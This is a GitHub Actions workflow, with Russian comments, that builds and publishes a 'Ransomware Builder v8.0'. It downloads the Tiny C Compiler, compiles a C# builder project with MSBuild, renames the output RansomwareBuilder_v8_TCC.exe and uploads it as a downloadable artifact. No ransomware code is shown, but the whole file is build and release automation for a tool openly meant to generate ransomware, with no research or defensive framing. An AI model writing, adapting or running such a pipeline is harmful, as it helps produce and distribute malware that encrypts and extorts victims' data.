name: Build Ransomware Builder v8.0 (TCC)

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
    
    # ========== СКАЧИВАЕМ TCC ==========
    - name: Download TCC
      run: |
        Invoke-WebRequest -Uri "https://github.com/TinyCC/tinycc/raw/master/tcc.exe" -OutFile "tcc.exe"
        if (Test-Path tcc.exe) {
          Write-Host "=== TCC downloaded successfully ==="
        } else {
          Write-Host "=== TCC download failed ==="
          exit 1
        }
    
    # ========== СБОРКА БИЛДЕРА (C#) ==========
    - name: Setup MSBuild
      uses: microsoft/setup-msbuild@v2
    
    - name: Restore NuGet packages
      run: |
        dotnet restore builder.csproj --runtime win-x86
    
    - name: Build Builder
      run: |
        msbuild builder.csproj /p:Configuration=Release /p:Platform="Any CPU"
        
        if (Test-Path "bin\Any CPU\Release\net48\builder.exe") {
          Write-Host "=== Build SUCCESS ==="
          Get-ChildItem "bin\Any CPU\Release\net48\builder.exe" | Format-Table -AutoSize
          Copy-Item "bin\Any CPU\Release\net48\builder.exe" "RansomwareBuilder_v8_TCC.exe"
        } else {
          Write-Host "=== Build FAILED ==="
          exit 1
        }
    
    - name: Upload Builder EXE
      uses: actions/upload-artifact@v4
      with:
        name: RansomwareBuilder_v8_TCC
        path: RansomwareBuilder_v8_TCC.exe
